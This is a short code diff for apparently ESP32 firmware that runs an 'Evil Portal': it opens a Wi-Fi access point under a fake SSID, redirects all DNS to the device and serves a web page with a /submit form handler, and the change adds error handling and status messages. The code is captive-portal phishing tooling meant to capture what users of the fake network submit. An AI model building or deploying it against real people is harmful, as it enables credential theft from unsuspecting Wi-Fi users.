@@ -74,19 +74,29 @@ bool start(const String &fakeSsid, uint32_t maxDurationMs) {
 
     ensureLogFile();
 
-    WiFi.softAP(fakeSsid.c_str());
+    if (!WiFi.softAP(fakeSsid.c_str())) {
+        Serial.println("✗ Failed to start SoftAP");
+        return false;
+    }
     IPAddress apIP = WiFi.softAPIP();
+    Serial.println("✓ SoftAP started at " + apIP.toString());
 
     g_dns = new DNSServer();
     if (!g_dns) {
-        Serial.println("ERROR: Failed to allocate DNSServer");
+        Serial.println("✗ Failed to allocate DNSServer");
         return false;
     }
-    g_dns->start(53, "*", apIP);
+    if (!g_dns->start(53, "*", apIP)) {
+        Serial.println("✗ Failed to start DNS server");
+        delete g_dns;
+        g_dns = nullptr;
+        return false;
+    }
+    Serial.println("✓ DNS server started");
 
     g_server = new WebServer(80);
     if (!g_server) {
-        Serial.println("ERROR: Failed to allocate WebServer");
+        Serial.println("✗ Failed to allocate WebServer");
         delete g_dns;
         g_dns = nullptr;
         return false;
@@ -95,9 +105,11 @@ bool start(const String &fakeSsid, uint32_t maxDurationMs) {
     g_server->on("/submit", HTTP_POST, handleSubmit);
     g_server->onNotFound(handleRoot);
     g_server->begin();
+    Serial.println("✓ Web server started on port 80");
 
     g_deadline = millis() + maxDurationMs;
     g_active = true;
+    Serial.println("✓ Evil Portal active");
     return true;
 }
 
